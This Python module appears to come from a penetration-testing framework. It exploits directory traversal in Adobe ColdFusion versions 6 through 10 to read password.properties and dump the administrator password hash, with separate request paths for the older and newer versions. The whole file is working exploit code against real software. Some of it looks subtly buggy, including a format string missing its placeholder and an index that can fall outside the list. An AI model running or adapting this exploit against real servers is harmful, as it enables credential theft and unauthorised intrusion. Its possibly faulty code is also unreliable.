from auxiliary import Auxiliary
from log import LOG
import utility
import re


class Auxiliary:
    """ Classic password hash retrieval in versions
    6,7,8,9, and 10.  9/10 do it a bit differently, so we use a separate
    function for that.
    """

    def __init__(self):
        self.name = 'Administrative Hash Disclosure'
        self.versions = ["6.0", "7.0", "8.0", "9.0", "10.0"]
        self.show = False
        self.flag = 'cf-hash'

    def check(self, fingerprint):
        """
        """

        if fingerprint.version in self.versions:
            return True

        return False

    def run(self, fingerengine, fingerprint):
        utility.Msg("Attempting to dump administrative hash...")

        if float(fingerprint.version) > 8.0:
            return self.run_latter(fingerengine, fingerprint)

        directories = ['/CFIDE/administrator/enter.cfm',
                       '/CFIDE/wizards/common/_logintowizard.cfm',
                       '/CFIDE/administrator/archives/index.cfm',
                       '/CFIDE/install.cfm',
                       '/CFIDE/administrator/entman/index.cfm',
                      ]

        base = "http://{0}:{1}".format(fingerengine.options.ip, fingerprint.port)
        for path in directories:

            uri = "{0}?locale={1}ColdFusion8"\
                  "\lib\password.properties%00en"
            for dots in range(7,12):

                if fingerengine.options.remote_os == 'linux':
                    t_url = uri.format(path, "../" * dots)
                else:
                    t_url = uri.format(path, "..\\" * dots)

                response = utility.requests_get(base + t_url)
                if response.status_code == 200:

                    pw_hash = re.findall("password=(.*?)\r\n", response.content)
                    if len(pw_hash) > 0:
                        utility.Msg("Administrative hash: %s" % pw_hash[1], LOG.SUCCESS)
                        return

    def run_latter(self, fingerengine, fingerprint):
        """ There's a slightly different way of doing this for 9/10, so we do that here
        """

        paths = []
        base = "http://{0}:{1}".format(fingerengine.options.ip, fingerprint.port)
        uri = "/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it"\
              "&attributes.file=../../administrator/mail/download.cfm"\
              "&filename={0}&attributes.locale=it&attributes.var=it"\
              "&attributes.jscript=false&attributes.type=text/html"\
              "&attributes.charset=UTF-8&thisTag.executionmode=end"\
              "&thisTag.generatedContent=htp"

        if fingerengine.options.remote_os == 'linux':
            paths.append('{0}opt/coldfusion/cfusion/lib/password.properties'.format("../" * 9))
            if fingerprint.version == "9.0":
                paths.append('{0}opt/coldfusion9/cfusion/lib/password.properties'\
                                                            .format("../" * 9))
            else:
                paths.append('{0}opt/coldfusion10/cfusion/lib/password.properties'\
                                                            .format("../" * 9))

        else:
            paths.append('{0}ColdFusion\lib\password.properties'.format("..\\" * 9))
            if fingerprint.version == "9.0":
                paths.append('{0}ColdFusion9\lib\password.properties'\
                                                    .format("..\\" * 9))
                paths.append('{0}ColdFusion9\cfusion\lib\password.properties'\
                                                .format("..\\" * 9))
            else:
                paths.append('{0}ColdFusion10\lib\password.properties'\
                                                    .format("..\\" * 9))
                paths.append('{0}ColdFusion10\cfusion\lib\password.properties'\
                                                    .format("..\\" * 9))

        for path in paths:
            url = base + uri.format(path)

            response = utility.requests_get(url)
            if response.status_code == 200:

                pw_hash = re.findall("password=(.*?)\r\n", response.content)
                if len(pw_hash) > 0:
                    utility.Msg("Administrative hash: %s" % pw_hash[1], LOG.SUCCESS)
                    return

        utility.Msg("Failed to obtain hash (HTTP %d)" % response.status_code, 
                                                            LOG.ERROR)
